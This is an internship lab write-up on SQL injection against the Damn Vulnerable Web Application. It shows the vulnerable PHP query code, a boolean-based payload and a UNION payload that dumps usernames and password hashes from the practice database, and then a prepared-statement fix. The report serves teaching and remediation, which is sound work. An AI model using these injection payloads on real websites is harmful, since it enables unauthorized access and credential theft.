# Task 3: SQL Injection Testing & Remediation

**Author**: Gyandeep Duwarah  
**Internship**: Oasis Infobyte (OIBSIP) — Cybersecurity Track  
**Target**: Damn Vulnerable Web Application (DVWA) - Low Security  
**Module**: SQL Injection (`/vulnerabilities/sqli/`)  

---

## 1. Vulnerability Overview

In DVWA (Low Security), user input is directly concatenated into the SQL query string without sanitization or parameterization:

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    $id = $_REQUEST[ 'id' ];

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    while( $row = mysqli_fetch_assoc( $result ) ) {
        $first = $row["first_name"];
        $last  = $row["last_name"];

        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
?>
```

---

## 2. Normal Query Test

Input: `1`

Query executed:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

Output:
```text
ID: 1
First name: admin
Surname: admin
```

---

## 3. Exploit 1: Boolean-Based SQL Injection

Input:
```text
1' OR '1'='1
```

Query executed:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

Output:
```text
ID: 1' OR '1'='1
First name: admin
Surname: admin

ID: 1' OR '1'='1
First name: Gordon
Surname: Brown

ID: 1' OR '1'='1
First name: Hack
Surname: ME

ID: 1' OR '1'='1
First name: Pablo
Surname: Picasso

ID: 1' OR '1'='1
First name: Bob
Surname: Smith
```

---

## 4. Exploit 2: UNION-Based Query Injection

Payload:
```text
1' UNION SELECT user, password FROM users #
```

Query executed:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users #';
```

Output:
```text
ID: 1' UNION SELECT user, password FROM users #
First name: admin
Surname: admin

ID: 1' UNION SELECT user, password FROM users #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' UNION SELECT user, password FROM users #
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' UNION SELECT user, password FROM users #
First name: 1337
Surname: 8d3b75712f174179e8607066e4a07865

ID: 1' UNION SELECT user, password FROM users #
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' UNION SELECT user, password FROM users #
First name: bsmith
Surname: 21232f297a57a5a743894a0e4a801fc3
```

---

## 5. Remediation: Prepared Statements

### Vulnerable Code
```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($conn, $query);
```

### Fixed Code (PDO Prepared Statements)
```php
<?php
$id = $_GET['id'];

$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
$stmt->bindValue(':id', $id, PDO::PARAM_INT);
$stmt->execute();

$results = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach ($results as $row) {
    echo "First name: " . htmlspecialchars($row['first_name'], ENT_QUOTES, 'UTF-8') . "<br />";
    echo "Surname: " . htmlspecialchars($row['last_name'], ENT_QUOTES, 'UTF-8') . "<br />";
}
?>
```
